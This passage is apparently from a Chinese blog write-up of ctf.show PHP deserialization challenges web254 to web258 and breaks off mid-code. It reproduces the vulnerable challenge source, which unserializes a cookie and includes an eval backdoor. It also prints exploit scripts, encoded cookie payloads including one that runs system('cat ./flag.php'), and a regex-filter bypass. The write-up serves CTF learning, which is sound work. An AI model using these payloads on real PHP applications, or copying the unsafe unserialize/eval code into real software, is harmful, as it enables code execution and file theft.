class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];<span class="comment">//采用get方式传参</span></span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123; <span class="comment">//isset() 函数用于检测变量是否已设置并且非 NULL,如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE。</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();                  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题的过关思路非常明确，只要采用get方式传入username和password即可</p><p><code>http://e1a42de1-2eea-4e60-8e59-6195fa9e579e.challenge.ctf.show/?username=xxxxxx&amp;&amp;password=xxxxxx</code></p><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    <span class="comment">//此处的unserialize()进行了反序列化</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;               <span class="comment">//将isVip序列化为true即可</span></span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此我们可以清楚的知道解题思路：</p><p>利用cookie传入我们构造好的序列化对象，通过get传入username和password即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> ctfShowUser()));</span><br></pre></td></tr></table></figure><p>url: <code>http://7d0b2d32-8a9e-407a-8ff1-7f9b79c1ddf5.challenge.ctf.show/?username=xxxxxx&amp;&amp;password=xxxxxx</code></p><p>cookie:<code>user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></p><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;   <span class="comment">//此处若username不等于password则为True</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化的宗旨就是通过类内的属性来改变类的方法。</p><p>利用cookie传入我们构造好的序列化对象，更改username与password的值即可，通过get传入我们设定好的username和password即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> ctfShowUser()));</span><br></pre></td></tr></table></figure><p>cookie:<code> O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></p><p>url:<code> http://802701c6-6546-4367-9b0e-49693c504b80.challenge.ctf.show/?username=1&amp;&amp;password=2</code></p><h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code); <span class="comment">//eval()函数会将字符串当作代码执行，我们可以利用这个函数读取文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><p>更改ctfShowUser中的__construct()函数时期new一个 backDoor对象，将$code变量改为我们输入指令即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;cat ./flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$user</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>cookie:<code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A25%3A%22system%28%22cat+.%2Fflag.php%22%29%3B%22%3B%7D%7D</code></p><p>url:<code> ?username=xxxxxx&amp;&amp;password=xxxxxx</code></p><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;  <span class="comment">//和上一题思路是一样的就是多了一个正则表达式过滤</span></span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：</p><p>采用将O：转换为O:+</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 